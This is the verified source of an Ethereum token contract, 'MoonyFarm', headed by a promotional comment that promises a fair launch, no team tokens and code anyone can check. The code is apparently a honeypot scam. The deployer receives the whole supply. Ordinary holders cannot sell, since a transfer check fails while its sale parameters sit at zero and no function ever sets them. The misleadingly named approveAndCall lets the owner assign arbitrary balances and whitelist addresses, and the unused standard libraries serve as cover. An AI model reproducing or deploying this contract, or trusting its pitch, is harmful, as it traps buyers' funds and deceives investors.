/**
 *Submitted for verification at Etherscan.io on 2021-04-25
*/

/*
Welcome to MOONY Farm

Hey guys! Hello and welcome to Moony farm!
Lets first explain this name. What we felt, is, we, especially our financial lives, are tied down by rules set by banks, loan providing authorities, financial regulatory authorities. You need to do exactly what they ask you to do, even to access your own money! For example, you keep too much money in the bank, you pay for that (taxes), you keep too little there and you pay again (fines). How you can send money abroad, to your family, love or simply to buy something, is again, determined by them. We say, well, to hell with them! Lets MOONY those rules and be the owner of our hard-earned fortune!
That goes for centralised finance, or CeFi. Then we had DeFi, or Decentralised Finance. It came to change the scenario and that it did, to an extent. We saw amazing growth for YFI, Curve and so many of those copies and clones. However, again, these project suffered from multiple issues.
Mindless issuance of tokens: or, a very high emission rate which leads to hyperinflation. This leads to another horrible scenario which burnt many newbies, Impermanent Loss or IL. More on this later.
Dev/Team owning unlocked tokens: and dumping them on the buyer and making it crash. Yikes!
Technical snag: We remember what happened to YAM, no? From $160 to 16 cents within minutes. That’s because the team was too confident of their code and didn’t bother to get this checked.
Scam/Rug: well, if you are even a week old in this market, you know what we are talking about.
Whale manipulation: They buy early, they get special discounted rates and they dump when we the commoners have worked hard as a community to pump the price. They cause a sharp slump, create panic and wait for it to go lower to re-buy and continue this circle. We HATE that!
Influencer Shilling: You must be knowing this by now, none of those ‘influencers’ want you to get rich, they aren’t the proverbial good Samaritans. They will probably shill an outright scam, if they are paid enough. We all know that one guy who promised to eat his own **** on live TV. Going by his tweets, he already have his **** very close to his mouth, in his head.
We say, let’s MOONY all of these. Thus, the name, MOONY, which is, also, a clever wordplay of DeFi, we believe.
OK, Enough about others, lets talk about ourselves.
MOONY is going to address to all those issues as mentioned above. Not too long ago, we were in your place and suffered from the same and decided to do something about these. Lets discuss our plans in short.
Please note, MOONY have V2 and V3 planned well in advance but this article is going to talk about V1, which is launching in 4 days approximately.
Frankly, we love the RFI model, or the deflationary model. BTC is costly because its theoretically non-inflationary and practically deflationary (BTC getting lost). We will follow the RFI model but we are also aware of the inherent drawbacks and thus, we decided to tweak this model to suit us all and, thus, by default, address the issues mentioned above.
1. Mindless issuance of tokens: As we will follow a highly tweaked RFI model, the model is deflationary by default. No new token will ever be issued.
2. Dev/Team owning unlocked tokens: None, nada token kept for team. We all start from equal grounds.
3. Technical Snag: Our codes will be open for public audit. We will share github link just before the launch. As soon as we can afford, we are going for Certik or comparable auditors! Just don’t remind us what happened to icecreamswap even after audit…oops.!
4. Scam/Rug: Hey, don’t trust us! Trust the code. Get it checked by a dev you trust! If you don’t feel confident, don’t enter! Please don’t enter.
5. Whale manipulation: We have the mathematical model ready to combat this. This is coming in V2, we promise. This requires extensive testing and much bigger dev power. Give us a couple of months to get this implemented. For now, there will be no presale or heavily discounted sale to whales, they start on equal footing!
6. Influencer Shilling: We don’t have money for this! That’s it.
And what else we offer?
1. No presale/private sale: Yep, none of that shit!
2. Liquidity locking: All of that coming from our pocket and we will use Cryptex to lock that for 1 year.
3. Fair launch.
BTW, you might wonder, why do we have FARM in our name? Because, yes, you are reading this right, we have found a way to offer farm rewards without issuing or minting new tokens. We will explain this right before the launch.
For now, that’s all boys and babes! Feel free to ask us more, our social media links are as follows
Website: moony.farm 
Twitter: https://twitter.com/moonyfarm
Telegram Channel: https://t.me/moonyfarm
To the moon and beyond!
(This article is written by a non-native speaker of English. Learn when to ignore SPAG and go for the content!)
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract MoonyFarm {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}